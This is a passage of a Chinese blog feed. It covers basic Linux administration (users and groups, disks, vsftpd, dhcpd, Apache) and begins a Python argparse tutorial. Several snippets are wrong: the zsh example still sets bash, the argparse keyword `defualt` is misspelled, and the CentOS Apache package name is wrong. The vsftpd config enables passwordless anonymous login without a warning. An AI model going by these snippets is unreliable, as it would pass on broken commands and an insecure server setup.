</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man rpm
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在都是直接用 <code>yum</code> 或者 <code>dnf</code> 这种包管理器了，使用远程仓库来安装和管理软件包。</p>
<h2 id="文档编辑">文档编辑</h2>
<p>至于文档编辑，就需要用 <code>vi</code> 或者 <code>vim</code>。</p>
<p>这个也是常有的事</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim [文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>引用一个<a href="https://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener noreffer">菜鸟教程的链接吧</a></p>
<p>我平常就用个 <code>i</code> 来编辑文档， <code>ESC</code> 来退出编辑模式， <code>:w</code> 保存， <code>:q</code> 来退出。</p>
<p>有时候要加个 <code>!</code> 强制执行。</p>
<p>保存退出是 <code>:wq</code></p>
<p>如果有其他需求我会用 <code>man</code> 来看文档。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man vim
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="用户和组的管理">用户和组的管理</h2>
<p>安装 Arch 的时候要干的事，就是用 <code>useradd</code> 添加用户。</p>
<p>桌面系统往往不使用 root 用户， 会添加一个或多个普通用户。</p>
<p>有些多人协作部署的服务器也会利用 Linux 多用户的特性。</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>提示<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>GNU/Linux 系统中的每一个文件都从属一个用户（属主）和一个用户组（属组）。另外，还有三种类型的访问权限：读（read）、写（write）、运行（execute）。我们可以针对文件的属主、属组、而设置相应的访问权限。</p>
<p>—— 摘自&amp;&amp;详见 <a href="https://wiki.archlinux.org/title/Users_and_groups_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E6%9D%83%E9%99%90%E4%B8%8E%E5%B1%9E%E4%B8%BB" target="_blank" rel="noopener noreffer">ArchWiki</a></p>
</div>
        </div>
    </div>
<h3 id="useradd">useradd</h3>
<p>这个命令用来添加用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">useradd [选项] 用户名
</span></span></code></pre></td></tr></table>
</div>
</div><p>先把参数用法贴上</p>
<ul>
<li><code>-m</code> / <code>--create-home</code> 创建用户主目录<code>/home/[用户名]</code>；在自己的主目录内，即使不是root用户也可以读写文件、安装程序等等。</li>
<li><code>-G</code> / <code>--groups</code> 用户要加入的附加组列表；使用逗号分隔多个组，不要添加空格；如果不设置，用户仅仅加入初始组。</li>
<li><code>-s</code> / <code>--shell</code> 用户默认登录shell的路径；启动过程结束后，默认启动的登录shell在此处设定；请确保使用的shell已经安装，默认是 Bash。</li>
</ul>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>提示<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>使用 <code>useradd --defaults</code> 可以查看 shell 的默认值。默认是 Bash。使用 <code>-s</code> / <code>--shell</code> 选项可以设置其他值。<code>/etc/shells</code> 记录了可以使用的登录 shell。</p>
<p>—— 摘自 <a href="https://wiki.archlinux.org/title/Users_and_groups_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">ArchWiki</a></p>
</div>
        </div>
    </div>
<p>比如我要在一个新机器上创建一个用户，用户名为 <code>weepingdogel</code> 且需要创建用户主目录 <code>/home/weepingdogel</code>， <strong>而且加入到 <code>wheel</code> 这个组</strong> ,默认 <strong>shell</strong> 设置为 <strong>Bash</strong> 。</p>
<p>我就会执行这条命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">useradd -G wheel -m -s /bin/bash weepingdogel
</span></span></code></pre></td></tr></table>
</div>
</div><p>那如果我要 <code>zsh</code> 呢？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">useradd -G wheel -m -s /bin/bash weepingdogel
</span></span></code></pre></td></tr></table>
</div>
</div><p>就像这样咯～</p>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><ol>
<li>新增用户不能与已存在用户的用户名相同;</li>
<li>用户创建后，用户名或组需被 <code>/etc/sudoers</code> 文件包含，否则无法使用 <code>sudo</code> 调取 root 权限;</li>
<li><del>别瞎j8乱创建一堆没卵用的用户</del></li>
<li>请确保使用的shell已经安装，默认是 Bash。 没装上的 shell 没法用，用户创建不了。</li>
</ol>
</div>
        </div>
    </div>
<h3 id="userdel">userdel</h3>
<p>这个命令用来删除用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">userdel [选项] 用户名
</span></span></code></pre></td></tr></table>
</div>
</div><p>加上 <code>-r</code> 选项可以一并删除用户主目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">userdel -r 用户名
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><strong><del>别瞎j8乱删用户</del></strong></div>
        </div>
    </div>
<p>没什么好说的，详见 <a href="https://linux.die.net/man/8/userdel" target="_blank" rel="noopener noreffer">man userdel</a> 。</p>
<h3 id="groups">groups</h3>
<p>这个命令用来查看用户属于哪些组。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">groups [用户名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>当然我们也可以通过查看 <code>/etc/group</code> 来查看所有组。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /etc/group
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="id">id</h3>
<p>这个命令可以显示用户的一些额外信息，比如 <code>UID</code> 、 <code>GID</code> 等等。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">id [用户名]
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="groupadd-和-groupdel">groupadd 和 groupdel</h3>
<p>前者是创建新组，后者是删除一个组。</p>
<p>创建一个新组：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">groupadd [组名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>删除一个用户组：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">groupdel [组名]
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><strong><del>别瞎j8乱删组</del></strong></div>
        </div>
    </div>
<h3 id="groupmod">groupmod</h3>
<p>往往用来更改用户所属组的名字，但不变更 <code>GID</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">groupmod -n [新名字] [旧名字]
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="gpasswd">gpasswd</h3>
<p>往往用来变更用户所属于哪个组的情况。</p>
<p>比如将某个用户添加到某个组：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gpasswd -a [用户名] [组名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>或者将用户从某个组中移除：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gpasswd -d [用户名] [组名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>其他的用法也可以参考 <a href="https://linux.die.net/man/1/gpasswd" target="_blank" rel="noopener noreffer">man gpasswd</a></p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>提示<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">如果用户已经处于登录状态，必须重新登录才能更改生效。</div>
        </div>
    </div>
<h3 id="一些相关文件列表">一些相关文件列表</h3>
<ul>
<li><code>/etc/shadow</code> 	保存用户安全信息</li>
<li><code>/etc/passwd</code> 	用户账户信息</li>
<li><code>/etc/gshadow</code> 	保存组账号的安全信息</li>
<li><code>/etc/group</code> 	    定义用户所属的组</li>
<li><code>/etc/sudoers</code> 	可以运行 sudo 的用户</li>
<li><code>/home/* </code>	    主目录</li>
</ul>
<p>要好好记住它们。</p>
<h2 id="基本磁盘管理">基本磁盘管理</h2>
<p>当然也涉及到了磁盘的管理，这个其实在安装 Arch 的时候就能接触不少。</p>
<h3 id="查看分区情况">查看分区情况</h3>
<p>当 Linux 识别到磁盘，就会将其分配为一个块设备， 在系统里是个文件，比如 <code>/dev/sda</code>、<code>/dev/nvme0n1</code> 或 <code>/dev/mmcblk0</code>。可以使用 <code>lsblk</code> 或者 <code>fdisk</code> 查看：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fdisk -l
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>提示<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">不同的设备当中，磁盘的块设备表示也不同，比如使用 SATA 接口的硬盘会被显示为 <code>/dev/sd*X</code>， 而使用 NVME 硬盘则会显示为 <code>/dev/nvme*n*</code></div>
        </div>
    </div>
<h3 id="创建编辑分区">创建编辑分区</h3>
<p>你可以去搜索引擎找 <code>fdisk</code> 的说明，按照它来创建、编辑分区，可以用简单的 <code>cfdisk</code>。</p>
<p></p>
<p>甚至可以用一些发行版自带的图形化分区工具。</p>
<h3 id="格式化">格式化</h3>
<p>分区创建好以后，就要选择合适的文件系统来进行格式化。</p>
<p>文件系统有哪些？具体可以参考<a href="https://wiki.archlinux.org/title/File_systems_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">这个页面</a></p>
<p>Linux 往往用 EXT4</p>
<p>使用 mkfs</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkfs.ext4 /dev/partition
</span></span></code></pre></td></tr></table>
</div>
</div><p>挂载分区</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mount [被挂载的分区] [要挂载到的地方]
</span></span></code></pre></td></tr></table>
</div>
</div><p>当然也可以写 <code>/etc/fstab</code> 来进行自动挂载，详情可以看<a href="https://wiki.archlinux.org/title/Fstab_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E8%87%AA%E5%8A%A8%E6%8C%82%E8%BD%BD" target="_blank" rel="noopener noreffer">这里</a></p>
<h2 id="资源共享服务">资源共享服务</h2>
<h3 id="ftp">FTP</h3>
<p>搭建 FTP 服务器</p>
<p>首先使用包管理器安装 <code>vsftpd</code></p>
<p>deb</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install vsftpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>centos</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo yum install vsftpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过编辑 <code>/etc/vsftpd.conf</code> 来配置</p>
<p>比如允许匿名登录，以及允许无密码登录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">anonymous_enable=YES
</span></span><span class="line"><span class="cl">no_anon_password=YES
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后通过 systemd 启动</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo systemctl start vsftpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过客户端连接</p>
<p></p>
<p>参考<a href="https://wiki.archlinux.org/title/Very_Secure_FTP_Daemon_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E9%85%8D%E7%BD%AE" target="_blank" rel="noopener noreffer">Arch Wiki</a>， 可根据实际情况调整配置。</p>
<h3 id="samba">Samba</h3>
<p>不搞这玩意，太危险了。</p>
<h2 id="dhcp-服务器">DHCP 服务器</h2>
<p>直接安装 dhcpd</p>
<p>deb</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install dhcpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>centos</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">yum install -y dhcpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>pacman</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo pacman -S dhcpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>写配置文件 <code>/etc/dhcpd.conf</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># No DHCP service in DMZ network (192.168.2.0/24)
</span></span><span class="line"><span class="cl">subnet 192.168.2.0 netmask 255.255.255.0 
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后通过 systemd 来启动服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo systemctl start dhcpd4
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="dns-服务器">DNS 服务器</h2>
<p>懒得搞了，不难</p>
<p>参考 <a href="https://wiki.archlinux.org/title/BIND_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">https://wiki.archlinux.org/title/BIND_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
<h2 id="apache-服务器">Apache 服务器</h2>
<p>这个简单</p>
<p>deb</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install apache2
</span></span></code></pre></td></tr></table>
</div>
</div><p>pacman</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo pacman -S apache
</span></span></code></pre></td></tr></table>
</div>
</div><p>rpm</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo yum install -y apache2
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接启动服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo systemctl start httpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后访问 <code>http://127.0.0.1:80</code>就行。</p>
<h1 id="总结">总结</h1>
<p><del>什么垃圾书！</del></p>
<p>很简单，但是太老了，跟不上时代了。</p>
<p>还是自己去网上找资料来得快。</p>
]]></description>
</item><item>
    <title>Python 学习笔记——ArgParse</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/</link>
    <pubDate>Sun, 16 May 2021 18:21:05 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-argparse/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-05-16-18-25-46%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be.png" referrerpolicy="no-referrer">
            </div><h1 id="序">序</h1>
<p>为了使 <a href="https://github.com/WeepingDogel/TitleGetter" target="_blank" rel="noopener noreffer">TitleGetter</a> 更加灵活，我打算将 <code>list.txt</code> 和输出文件由用户自定， 因此这需要用到命令行选项&hellip; 就像一些我们常用到的软件一样，比如 <code>pacman</code></p>
<p></p>
<p>因此谷歌了一下，了解到了 <a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">ArgParse</a> 这个东西</p>
<blockquote>
<p>The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically generates help and usage messages and issues errors when users give the program invalid arguments.</p>
<p>From: <a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></p>
</blockquote>
<p>然后我就试着敲了一个文件..</p>
<p>运行出来的结果是这样的</p>
<p></p>
<p>那么接下来稍微整理一下相关的笔记吧&hellip;..</p>
<h1 id="创建-parser--添加选项">创建 Parser &amp;&amp; 添加选项</h1>
<p>在一切开始之前，我们需要使用 <code>argparse</code> 库里面的 <code>ArgumentParser</code> 用法来创建一个变量，命名为 &lsquo;parser&rsquo;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里有个参数 <code>description=''</code>， 这里是写一些说明用的&hellip;</p>
<p>比如我们写上</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>顺便我们需要写上一些需要的选项～</p>
<p><code>parser.add_argument()</code> 使用这个就可以了</p>
<p>里面需要加上一些东西, 比如 <code>-a</code>、 <code>--about</code> 这些选项的使用形式</p>
<p>最后加上 <code>args = parser.parse_args()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Show the about&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这时我们已经可以加上 <code>-h</code> 来看看效果了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ python a.py -h
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">usage: a.py [-h] [-a ABOUT]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">optional arguments:
</span></span><span class="line"><span class="cl">  -h, --help            show this help message and exit
</span></span><span class="line"><span class="cl">  -a ABOUT, --about ABOUT
</span></span><span class="line"><span class="cl">                        Show the about
</span></span></code></pre></td></tr></table>
</div>
</div><p>那么这里整理一下常用的这么几个参数</p>
<ol>
<li><code>default</code>
<ul>
<li>没有设置任何参数情况下的默认参数</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Show the about&#39;</span><span class="p">,</span> <span class="n">defualt</span><span class="o">=</span><span class="s1">&#39;text.txt&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>如果用户没有设置这个参数则会自动提供一个默认的</li>
</ul>
</li>
<li><code>help</code>
<ul>
<li>给对应的选项添加说明文字</li>
</ul>
</li>
<li>required
<ul>
<li>用于决定这个参数是否一定需要设置</li>
<li>如果设置了 <code>required=True</code>, 在运行时如果不设置这个参数就会报错</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">,</span><span class="s1">&#39;--about&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ python a.py   
</span></span><span class="line"><span class="cl">usage: a.py [-h] -a ABOUT
</span></span><span class="line"><span class="cl">a.py: error: the following arguments are required: -a/--about
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<h1 id="调用获取到的选项参数">调用获取到的选项参数</h1>
<p>接下来我们要做的是，将获取到的参数运用起来。</p>
<p>我们知道，当在命令行中给选项后面写上了一些东西，那么程序会默认地作为字符串而获取它，这时我们就要拿这获得的东西做我们想要做的事</p>
<p>我简单地写了个能够将一个文件的内容写到另一个文件的脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
